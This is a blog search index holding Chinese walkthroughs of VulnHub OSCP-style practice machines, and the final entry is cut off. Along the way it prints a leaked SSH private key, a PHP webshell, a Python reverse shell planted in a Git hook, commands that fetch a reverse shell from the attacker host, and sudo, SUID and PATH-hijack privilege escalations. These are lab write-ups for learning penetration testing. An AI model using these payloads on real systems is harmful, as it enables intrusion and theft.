<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>利用OpenSSH私钥登录</title>
      <link href="/posts/bbcbdc7c.html"/>
      <url>/posts/bbcbdc7c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>nmap扫端口：</p><p><img src="/posts/bbcbdc7c/image-20221212111910598.png"></p><p>开放端口</p><ul><li>22 ssh OpenSSH 8.2p1</li><li>80 http Apache httpd 2.4.41</li><li>33060 mysqlx?</li></ul><h2 id="2-发现SSH私钥"><a href="#2-发现SSH私钥" class="headerlink" title="2.发现SSH私钥"></a>2.发现SSH私钥</h2><p>扫描目录，扫描出了robots.txt，查看了一下，发现泄漏了文件secret.txt</p><p><img src="/posts/bbcbdc7c/image-20221212114815268.png"></p><p>查看secret.txt文件，首先这个文件名就很有意思，方向应该是对的。看到最后两个等号猜测是base64编码后的数据。</p><p><img src="/posts/bbcbdc7c/image-20221212114844237.png"></p><p>base64解码：</p><p><img src="/posts/bbcbdc7c/image-20221212114923426.png"></p><p>得到了OpenSSH的私钥文件，在kali上保存为secret.txt。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了私钥文件，但是没有用户名。这时仔细看80端口的网页，发现了提示：</p><p><img src="/posts/bbcbdc7c/image-20221212145508221.png"></p><p>OpenSSH除了可以用用户名密码登录之外，也可以利用私钥公钥对登录。现在利用用户名oscp和私钥登录靶机，-i参数指定私钥文件。命令如下：</p><pre class="line-numbers language-none"><code class="language-none">ssh -i secret.txt oscp@192.168.71.150<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/bbcbdc7c/image-20221212145620799.png"></p><p>登录成功，查看一下现在的权限，是oscp用户权限。</p><p><img src="/posts/bbcbdc7c/image-20221212150335574.png"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>思路还是suid提权，查找suid权限文件命令如下：</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/bbcbdc7c/image-20221212150503007.png"></p><p>发现bash文件可以直接利用。这里要注意加-p参数，否则提权不成功。</p><p>-p选项让bash保留启动时使用的有效用户id，而如果没有它，它将把有效uid设置为实际的uid(您的用户)。即-p参数可使会话保持在程序拥有者的权限，否则会回到本来的权限（本例为oscp用户）。</p><p><img src="/posts/bbcbdc7c/image-20221212151610328.png"></p><p>获取flag文件，提权成功！</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这个靶机非常简单，没有那么多绕的可以说只有一步。</p><p>我不熟悉的地方是获取到ssh私钥文件之后的登录方式，这次记住了。</p><p>另外在提权方面，suid文件提权用得情况很多，近期会出一个suid提权知识总结。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DevGuru：利用GitTools获取git仓库内容</title>
      <link href="/posts/790d5f77.html"/>
      <url>/posts/790d5f77.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/devguru-1,620/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>靶机地址：192.168.56.101；kali地址：192.168.56.103。用nmap扫描靶机开放端口</p><p><img src="/posts/790d5f77/image-20221201214433853.png"></p><p>开放端口：</p><ul><li><p>22：ssh OpenSSH 7.6p1</p></li><li><p>80：http Apache httpd 2.4.29</p></li><li><p>8585：tcp gitea git项目托管仓库</p></li></ul><p>80端口：一个公司的网页，无发现。</p><p><img src="/posts/790d5f77/image-20221201221652911.png"></p><p>8585端口：git项目仓库。根据nmap扫描结果，编辑&#x2F;etc&#x2F;hosts文件，把靶机的IP地址和域名devguru.local加入文件。</p><p><img src="/posts/790d5f77/image-20221201223932400.png"></p><p>访问用户仓库<a href="http://devguru.local:8585/frank/devguru-website.git%EF%BC%8C">http://devguru.local:8585/frank/devguru-website.git，</a> 因为没有frank权限无法访问项目内容，目前只能访问其主页。</p><p><img src="/posts/790d5f77/image-20221201224555186.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>扫描到后台内容管理系统：<a href="http://192.168.56.101/backend%EF%BC%8C">http://192.168.56.101/backend，</a> OctoberCMS，采用Laravel PHP框架。</p><p><img src="/posts/790d5f77/image-20221201215509411.png"></p><h2 id="2-提取git仓库获取账密信息"><a href="#2-提取git仓库获取账密信息" class="headerlink" title="2.提取git仓库获取账密信息"></a>2.提取git仓库获取账密信息</h2><p>在之前nmap扫描的时候，发现了git仓库地址<a href="http://192.168.56.101/.git">http://192.168.56.101:80/.git</a></p><p><img src="/posts/790d5f77/image-20221204131235351.png"></p><p>使用<a href="https://github.com/internetwache/GitTools">GitTools</a>中的gitdumper工具，将”.&#x2F;git”内容dump到kali，存在website文件夹中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./gitdumper.sh  http://devguru.local/.git website/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/4.png"></p><p>dump完成之后，发现文件不可读，这时要用GitTools中的Extractor工具来还原不完整的仓库内容。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./extractor.sh <span class="token punctuation">..</span>/website ./website<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204134049715.png"></p><p>现在可以查看git仓库中的内容了，通过查找提取的文件，发现adminer.php文件。</p><p><img src="/posts/790d5f77/image-20221204134526378.png"></p><p>访问adminer.php，这是一个PHP的mysql数据库登录页。</p><p><img src="/posts/790d5f77/image-20221204134730164.png"></p><p>返回到仓库文件夹，查找到了database.php文件，这可能是数据库相关文件。</p><p><img src="/posts/790d5f77/image-20221204140100642.png"></p><p>查看这个文件，发现了我们感兴趣的信息，还记得目录扫描出了名为October的CMS系统吗？这里很可能就是它的登录用户名和密码。</p><p><img src="/posts/790d5f77/image-20221204140406107.png"></p><p>尝试登录OctoberCMS，然而失败了。看来不是October的账户，而是上一步adminer.php的数据库账户。</p><p><img src="/posts/790d5f77/image-20221204140708582.png"></p><p>尝试登录adminer.php，登录成功！</p><p><img src="/posts/790d5f77/image-20221204140945212.png"></p><p>因为目的是登录CMS，所以首先关注到backend_users表，查看表中内容，发现了账户和密码信息。</p><p><img src="/posts/790d5f77/image-20221204141153799.png"></p><p>密码是经过加密的，用<a href="https://www.tunnelsup.com/hash-analyzer/">HashAnalyzer</a>分析数据库存储密码用的是Bcrypt算法。</p><p><img src="/posts/790d5f77/1qxR7_WrVmQbf_JKjA--yZQ.png"></p><p>我们现在拥有数据库的admin权限，可以修改账户密码，所以将用户密码更改为已知密码的hash。例如“123456”的Bcrypt hash。</p><p><img src="/posts/790d5f77/image-20221204141813005.png"></p><p><img src="/posts/790d5f77/image-20221204141936710.png"></p><p>然后尝试用<strong>frank:123456</strong>登录CMS，登录成功！</p><p><img src="/posts/790d5f77/image-20221204142058587.png"></p><h2 id="3-CMS中植入恶意代码获取webshell"><a href="#3-CMS中植入恶意代码获取webshell" class="headerlink" title="3.CMS中植入恶意代码获取webshell"></a>3.CMS中植入恶意代码获取webshell</h2><p>由于这个CMS只能保存htm文件，所以不能直接上次php反弹shell文件，但是可以通过修改htm文件，设置一个webshell来执行命令。</p><p><img src="/posts/790d5f77/image-20221204143612854.png"></p><p>新建一个shell文件，添加该文件的code：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">onStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"myVar"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204145503260.png"></p><p>在Markup中加入代码调用：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&#123;&#123; this.page.myVar &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204145534982.png"></p><p>这时cmd作为webshell的参数，可以接收命令。</p><p><img src="/posts/790d5f77/image-20221204145613176.png"></p><h3 id="webshell下载反弹shell文件"><a href="#webshell下载反弹shell文件" class="headerlink" title="webshell下载反弹shell文件"></a>webshell下载反弹shell文件</h3><p>利用webshell从主机上下载PHP的<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">反弹shell文件</a>。</p><p>kali上启动python HTTP服务等待靶机下载：</p><p><img src="/posts/790d5f77/image-20221204150754071.png"></p><p>webshell的wget命令下载shell.php文件到靶机。</p><p><img src="/posts/790d5f77/image-20221204151621505.png"></p><p><img src="/posts/790d5f77/image-20221204151658819.png"></p><p>在kali上监听端口等待回连，然后触发shell.php</p><p><img src="/posts/790d5f77/image-20221204151111116.png"></p><p><img src="/posts/790d5f77/image-20221204151935666.png"></p><p>反弹shell成功！此时是www-data用户权限。</p><p><img src="/posts/790d5f77/image-20221204151833373.png"></p><h2 id="4-提权到frank"><a href="#4-提权到frank" class="headerlink" title="4.提权到frank"></a>4.提权到frank</h2><p>利用python3转为bash终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看了&#x2F;home文件夹，只有frank一个用户，目前不可访问。看来要先提权到frank用户再提权到root用户。</p><p>继续浏览系统文件，发现了&#x2F;var&#x2F;backups文件夹，这种备份文件要引起注意。</p><p>查看其中的app.ini.bak文件，正是靶机使用的gitea应用的配置文件。其中，又发现了数据库信息。</p><p><img src="/posts/790d5f77/image-20221204155157250.png"></p><p>转到<a href="http://192.168.56.101/adminer.php%EF%BC%8C">http://192.168.56.101/adminer.php，</a> 登录！</p><p><img src="/posts/790d5f77/image-20221204155404626.png"></p><p><img src="/posts/790d5f77/image-20221204155445992.png"></p><p>查看user表，显示frank用户的密码和hash算法</p><p><img src="/posts/790d5f77/image-20221204155821899.png"></p><p>与上文同样的原理，将密码替换成已知的密码。</p><p><img src="/posts/790d5f77/image-20221204160432755.png"></p><p>现在登录8585端口的gitea应用</p><p><img src="/posts/790d5f77/image-20221204160548164.png"></p><p>登录成功，现在可以查看frank的仓库页面了。</p><p><img src="/posts/790d5f77/image-20221204160638563.png"></p><p> 因为这是frank权限的文件，所以如果在这里得到反弹shell，那么获取的应该是frank权限。</p><p>进入到项目的Setting页，点击 <strong>Git Hooks &gt; pre-receive &gt; Hook Content</strong>，添加python反弹shell代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.103",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204163541258.png"></p><p>但是要触发反弹shell代码，需要更新仓库，在点击提交的时候触发代码执行。</p><p>返回仓库页面，编辑README.md文件，随便在结尾添加几个空格，然后点击提交。</p><p><img src="/posts/790d5f77/image-20221204163919124.png"></p><p><img src="/posts/790d5f77/image-20221204163949564.png"></p><p>这时可以看到反弹shell成功！</p><p><img src="/posts/790d5f77/image-20221204164058080.png"></p><p>此时账户为frank权限。还需要继续提权到root。</p><p><img src="/posts/790d5f77/image-20221204164219253.png"></p><p>得到frank用户的flag。</p><p><img src="/posts/790d5f77/image-20221204164309349.png"></p><h2 id="5-提权到root"><a href="#5-提权到root" class="headerlink" title="5.提权到root"></a>5.提权到root</h2><p>查看frank用户可以用root权限执行sqlite3，而sudo版本为1.8.21,这个版本的sudo是<a href="https://www.exploit-db.com/exploits/47502">有漏洞的</a>。</p><p><img src="/posts/790d5f77/image-20221204164848083.png"></p><p><a href="https://www.exploit-db.com/exploits/47502">exploit</a>中的提权方法：</p><p><img src="/posts/790d5f77/image-20221204165205203.png"></p><p>但是我们的程序不是&#x2F;bin&#x2F;bash，而是sqlite3，查阅<a href="https://sqlite.org/cli.html#special_commands_to_sqlite3_dot_commands_">sqlite3的特殊命令</a></p><p><img src="/posts/790d5f77/image-20221204170231812.png"></p><p>因此用以下代码提权：</p><pre class="line-numbers language-none"><code class="language-none">sudo -u#-1 sqlite3 &#x2F;dev&#x2F;null &#39;.shell &#x2F;bin&#x2F;bash&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204170356631.png"></p><p>获取到root用户的flag</p><p><img src="/posts/790d5f77/image-20221204170524493.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>这个靶机对我来说难度比较大，总结一下考察的知识点有：</p><ul><li>GitTools的使用</li><li>数据库的知识</li><li>寻找可疑文件的能力</li><li>熟悉cms和git的反弹shell利用（webshell，php reverse shell，python reverse shell）</li><li>sudo版本脆弱性提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Healthcare：用big字典扫描隐藏目录</title>
      <link href="/posts/8c926676.html"/>
      <url>/posts/8c926676.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h2><p><img src="/posts/8c926676/image-20221202094737313.png"></p><p>nmap扫出了它的robots.txt，但是它里面的这些目录都不可访问。发现了一个疑似用户名oden，不知有没有用，先记录：</p><p><img src="/posts/8c926676/image-20221202095052236.png"></p><h2 id="2-Web服务枚举"><a href="#2-Web服务枚举" class="headerlink" title="2.Web服务枚举"></a>2.Web服务枚举</h2><p>80端口主页，有一个输入邮箱的地方，测试做了特殊字符过滤，没测出什么。</p><p><img src="/posts/8c926676/image-20221202095251275.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>用一般的字典没扫出其它东西，用 SecList的big字典扫描才扫出了敏感目录。以后有扫不出来的情况记得试一试这个。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://10.0.2.103 <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/8c926676/image-20221201173212613.png"></p><p>扫出目录：<a href="http://10.0.2.103/openemr/">http://10.0.2.103/openemr/</a></p><p><img src="/posts/8c926676/image-20221202093923266.png"></p><h3 id="利用OpenEMR-SQL注入漏洞"><a href="#利用OpenEMR-SQL注入漏洞" class="headerlink" title="利用OpenEMR SQL注入漏洞"></a>利用OpenEMR SQL注入漏洞</h3><p>该目录为<strong>OpenEMR v4.1.0</strong>的登录页，搜索该应用的exploit</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit openemr <span class="token number">4.1</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/8c926676/image-20221205143200744.png"></p><p>从搜索结果来看，该版本存在sql注入漏洞，按照exploit中的注入点试一下，确实存在漏洞。</p><p><img src="/posts/8c926676/image-20221205143426075.png"></p><p>而且根据错误提示来看，可以得到用户名和密码。</p><p>把&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;49742.py文件拷贝到当前工作目录，编辑py文件修改ip地址。</p><p><img src="/posts/8c926676/image-20221205144050503.png"></p><p>执行exploit，得到账密信息</p><p><img src="/posts/8c926676/image-20221205145655624.png"></p><p>将结果复制进hash.txt，然后用Johnny工具破解密码：</p><p><img src="/posts/8c926676/image-20221205152658003.png"></p><p>破解出密码为：</p><ul><li>admin:ackbar</li><li>medical:medical</li></ul><p><img src="/posts/8c926676/image-20221205152802859.png"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>用admin账户登录OpenEMR系统。</p><p><img src="/posts/8c926676/image-20221205153036024.png"></p><p>找到一处可以上传文件的地方</p><p><img src="/posts/8c926676/image-20221205155427926.png"></p><p>上传shell.php，这里没有做过滤，文件上传成功。接下来在kali监听端口，然后访问url触发。</p><p><img src="/posts/8c926676/image-20221205155717996.png"></p><p><img src="/posts/8c926676/image-20221205155737106.png"></p><p>反弹连接成功！</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p><img src="/posts/8c926676/image-20221205160221285.png"></p><p>目前是apache用户。</p><h3 id="提权到medical用户"><a href="#提权到medical用户" class="headerlink" title="提权到medical用户"></a>提权到medical用户</h3><p>进入&#x2F;home文件夹，发现了medical用户，还记得密码破解时破解出了medical用户的密码为medical，所以用这个密码切换到medical用户，成功！</p><p><img src="/posts/8c926676/image-20221205160601848.png"></p><p>用以下命令转换到&#x2F;bin&#x2F;bash（这个靶机里如果用python3会提示不存在，用python可以）。</p><pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="提权到almirant用户"><a href="#提权到almirant用户" class="headerlink" title="提权到almirant用户"></a>提权到almirant用户</h3><p>经过一番查找，在&#x2F;var&#x2F;backups目录中找到了shadow文件，查看shadow文件，发现了&#x2F;home文件夹中存在的用户almirant密码。</p><p><img src="/posts/8c926676/image-20221205162311039.png"></p><p>靶机里如果出现除了root的其它用户，一般都是需要提权到该用户的，所以现在得到了shadow文件，尝试用john破解密码。</p><p><img src="/posts/8c926676/image-20221205162652394.png"></p><p>破解密码为skywalker，切换到almirant用户。</p><p><img src="/posts/8c926676/image-20221205162814123.png"></p><p>在almirant用户的主文件夹中获取到user.txt</p><p><img src="/posts/8c926676/image-20221205162959785.png"></p><h3 id="提权到root用户"><a href="#提权到root用户" class="headerlink" title="提权到root用户"></a>提权到root用户</h3><p>用以下命令查找suid权限文件</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可疑文件healthcheck</p><p><img src="/posts/8c926676/image-20221205163819898.png"></p><p>这是一个靶机作者自己写的程序，就不像其他已知程序一样可以查阅suid获取root权限的命令，所以要先看一下这个程序是干嘛的。</p><p>运行程序发现它显示的是做系统健康检测，打印出网卡信息和磁盘信息等。用strings命令查看程序中包含的字符串：</p><p><img src="/posts/8c926676/image-20221205173421168.png"></p><p>这里可以看到程序执行了ifconfig打印网卡信息，但是它没有使用绝对路径，那么就可以创建一个假的”ifconfig“程序并更改环境变量，进行目录劫持。</p><p>在almirant用户目录下，依次执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ifconfigchmod +x ifconfigexport PATH&#x3D;&#x2F;home&#x2F;almirant:$PATH&#x2F;usr&#x2F;bin&#x2F;healthcheck <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/8c926676/image-20221205174354169.png"></p><p>程序执行后，提权到root成功！</p><p><img src="/posts/8c926676/image-20221205174622919.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>该靶机主要考察以下知识点：</p><ul><li>用“大字典”深度扫描目录；</li><li>已知漏洞exploit的利用；</li><li>密码破解工具；</li><li>suid权限文件，劫持环境变量提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Photographer：利用sambashare获取账密信息</title>
      <link href="/posts/d117200a.html"/>
      <url>/posts/d117200a.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/photographer-1,519/">https://www.vulnhub.com/entry/photographer-1,519/</a></p><p>这个靶机只能在virtualbox中打开，而kali是vmware的，因此需要一些网络配置才能使二者互通：<a href="https://blog.csdn.net/qq_43342566/article/details/102679837?spm=1001.2101.3001.6650.3">配置方法</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>地址信息</p><p>靶机地址：10.0.2.100</p><p>kali地址：10.0.2.102</p><p>nmap扫描开放端口和服务：</p><pre class="line-numbers language-none"><code class="language-none">nmap -A -sV 10.0.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130100955815.png"></p><p>开放端口信息</p><ul><li>80：http webserver  Apache httpd 2.4.18 (Ubuntu)</li><li>139 ：netbios-ssn Samba smbd 3.X - 4.X</li><li>445：netbios-ssn Samba smbd 4.3.11-Ubuntu</li><li>8000 ：http webserver Koken CMS</li></ul><p>测试思路</p><ul><li>80和8000端口：功能点测试、审查源码、JS文件、目录扫描</li><li>139和455端口：SMB协议枚举，利用已知漏洞</li></ul><h2 id="2-Web应用枚举"><a href="#2-Web应用枚举" class="headerlink" title="2.Web应用枚举"></a>2.Web应用枚举</h2><p>80端口：一个漂亮的网页，查看源码无发现。</p><p><img src="/posts/d117200a/image-20221129155203914.png"></p><p>8000端口：这是一个由名为koken的内容管理系统（CMS）搭建的。</p><p><img src="/posts/d117200a/image-20221129155230114.png"></p><p>通过目录扫描，发现了管理员登录界面。</p><p><img src="/posts/d117200a/image-20221129160601357.png"></p><h2 id="3-SMB协议枚举"><a href="#3-SMB协议枚举" class="headerlink" title="3.SMB协议枚举"></a>3.SMB协议枚举</h2><p>从端口扫描可以看到靶机系统为ubuntu，139和445端口利用samba实现在linux系统上的SMB协议。</p><p>使用<a href="https://www.kali.org/tools/enum4linux/">enum4linux</a>工具对目标Linux系统进行枚举.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token number">10.0</span>.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130105543201.png"></p><p>扫描结果显示“sambashare”共享可用，可以作为切入点。</p><p>继续查看enum4linux的输出，发现两个用户：daisa和agi。</p><p><img src="/posts/d117200a/image-20221130110250610.png"></p><p>尝试连接sambashare，先匿名登录，如果不行可能会用到上面两个用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">''</span> //10.0.2.100/sambashare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sambashare在无用户名和密码的情况下成功连接：</p><p><img src="/posts/d117200a/image-20221130110641601.png"></p><p>查看文件，里面有两个文件：一个txt文件，另一个似乎是wordpress的备份文件。</p><p>先查看txt文件看能否获取信息，再考虑比较复杂的wordpress文件。</p><p><img src="/posts/d117200a/image-20221130111204807.png"></p><p>txt文件内容貌似是一封信：</p><p><img src="/posts/d117200a/image-20221130111257519.png"></p><p>从信里的信息可以猜测，<strong>邮箱：<a 